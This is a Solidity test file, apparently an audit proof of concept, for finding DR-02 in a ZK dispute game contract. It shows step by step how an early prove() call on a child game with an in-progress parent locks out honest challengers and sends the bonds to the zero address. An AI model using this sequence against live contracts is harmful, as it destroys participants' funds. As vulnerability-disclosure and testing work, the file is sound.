// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

// Testing
import { DisputeGameFactory_TestInit } from "test/dispute/DisputeGameFactory.t.sol";

// Libraries
import { DevFeatures } from "src/libraries/DevFeatures.sol";
import { Claim, Duration, GameStatus, GameType, Timestamp } from "src/dispute/lib/Types.sol";
import { GameTypes } from "src/dispute/lib/Types.sol";
import { GameOver } from "src/dispute/lib/Errors.sol";

// Contracts
import { ZKDisputeGame } from "src/dispute/zk/ZKDisputeGame.sol";

// Interfaces
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IZKVerifier } from "interfaces/dispute/zk/IZKVerifier.sol";

/// @title ZKDeepReview_DR02
/// @notice PoC for DR-02: Early prover on a child whose parent is IN_PROGRESS permanently
///         locks out challengers. If the parent later resolves CHALLENGER_WINS, the child's
///         resolve() routes all bonds to `claimData.challenger == address(0)` (effectively
///         burned), denying any honest challenger the chance to extract them.
contract ZKDeepReview_DR02 is DisputeGameFactory_TestInit {
    ZKDisputeGame parentGame;
    ZKDisputeGame childGame;

    address proposer = address(0x1111);
    address earlyProver = address(0x2222);
    address honestChallenger = address(0x3333);

    GameType gameType = GameTypes.ZK_DISPUTE_GAME;
    Duration maxChallengeDuration = Duration.wrap(12 hours);
    Duration maxProveDuration = Duration.wrap(3 days);

    uint256 anchorL2SequenceNumber;
    uint256 parentL2SequenceNumber;
    uint256 childL2SequenceNumber;

    uint32 parentGameIndex;
    uint32 childGameIndex;

    function setUp() public override {
        super.setUp();
        skipIfDevFeatureDisabled(DevFeatures.ZK_DISPUTE_GAME);

        (, anchorL2SequenceNumber) = anchorStateRegistry.getAnchorRoot();
        parentL2SequenceNumber = anchorL2SequenceNumber + 1000;
        childL2SequenceNumber = anchorL2SequenceNumber + 2000;

        setupZKDisputeGame(
            ZKDisputeGameParams({
                maxChallengeDuration: maxChallengeDuration,
                maxProveDuration: maxProveDuration,
                absolutePrestate: bytes32(0),
                challengerBond: 1 ether
            })
        );

        // Move forward so games are created after respectedGameTypeUpdatedAt.
        vm.warp(block.timestamp + 1000);

        // Create the parent game (sentinel parent) and DO NOT resolve it. It stays IN_PROGRESS.
        vm.startPrank(proposer);
        vm.deal(proposer, 10 ether);
        parentGame = ZKDisputeGame(
            payable(
                address(
                    disputeGameFactory.create{ value: 1 ether }(
                        gameType,
                        Claim.wrap(keccak256("parent-claim")),
                        abi.encodePacked(parentL2SequenceNumber, type(uint32).max)
                    )
                )
            )
        );
        parentGameIndex = uint32(disputeGameFactory.gameCount() - 1);

        // Create the child game pointing at the IN_PROGRESS parent.
        childGame = ZKDisputeGame(
            payable(
                address(
                    disputeGameFactory.create{ value: 1 ether }(
                        gameType,
                        Claim.wrap(keccak256("child-claim")),
                        abi.encodePacked(childL2SequenceNumber, parentGameIndex)
                    )
                )
            )
        );
        childGameIndex = uint32(disputeGameFactory.gameCount() - 1);
        vm.stopPrank();
    }

    /// @notice Demonstrates DR-02: while the parent is IN_PROGRESS, an unrelated address
    ///         (`earlyProver`) calls `prove()` on the child. The child immediately becomes
    ///         `gameOver()` (because `prover != address(0)`), permanently locking out any
    ///         attempt to `challenge()`.
    function test_dr02_earlyProveLocksOutChallenger() public {
        // Parent is IN_PROGRESS — confirm precondition.
        assertEq(uint8(parentGame.status()), uint8(GameStatus.IN_PROGRESS));

        // Sanity: gameOver() should currently be false (no prover, deadline in future).
        assertFalse(childGame.gameOver());

        // Step 1: early prover calls prove() while parent is IN_PROGRESS. Mock verifier accepts.
        vm.prank(earlyProver);
        childGame.prove(bytes(""));

        // Step 2: Now gameOver() is true because prover != address(0).
        assertTrue(childGame.gameOver());

        // Step 3: Honest challenger attempts to challenge. Reverts at gameOver() check (line 377).
        vm.deal(honestChallenger, 1 ether);
        vm.prank(honestChallenger);
        vm.expectRevert(GameOver.selector);
        childGame.challenge{ value: 1 ether }();

        // The challenger has been permanently denied. claimData.challenger is still address(0).
        (,, address challenger_,,,) = childGame.claimData();
        assertEq(challenger_, address(0));
    }

    /// @notice Full PoC demonstrating bonds burned to address(0) when parent later resolves
    ///         CHALLENGER_WINS, completing the DR-02 attack.
    function test_dr02_fullAttackBondsBurnedToZeroAddress() public {
        // Step 1: Early prover proves the child while parent is IN_PROGRESS.
        vm.prank(earlyProver);
        childGame.prove(bytes(""));

        // Step 2: Honest challenger is denied (covered above).
        vm.deal(honestChallenger, 1 ether);
        vm.prank(honestChallenger);
        vm.expectRevert(GameOver.selector);
        childGame.challenge{ value: 1 ether }();

        // Step 3: Parent gets challenged and ends up CHALLENGER_WINS.
        vm.startPrank(honestChallenger);
        parentGame.challenge{ value: 1 ether }();
        vm.stopPrank();
        (,,,, Timestamp parentDeadline,) = parentGame.claimData();
        vm.warp(parentDeadline.raw() + 1 seconds);
        parentGame.resolve();
        assertEq(uint8(parentGame.status()), uint8(GameStatus.CHALLENGER_WINS));

        // Step 4: Resolve the child. It enters the "parentGameStatus == CHALLENGER_WINS" branch
        // (ZKDisputeGame.sol:471-477) and credits `claimData.challenger` (address(0))
        // with totalBonds.
        childGame.resolve();
        assertEq(uint8(childGame.status()), uint8(GameStatus.CHALLENGER_WINS));

        // The harm: bonds are credited to address(0). normalModeCredit[address(0)] == totalBonds.
        // Had the early prove not happened, an honest challenger would have legitimately
        // challenged, and on parent CHALLENGER_WINS this branch would credit them with totalBonds.
        // Instead bonds are burned (recoverable only via DelayedWETH guardian flow).
        assertEq(childGame.normalModeCredit(address(0)), childGame.totalBonds());
        assertEq(childGame.normalModeCredit(honestChallenger), 0);

        // Bonds are non-zero: this is real value being burned.
        assertGt(childGame.totalBonds(), 0);
    }
}
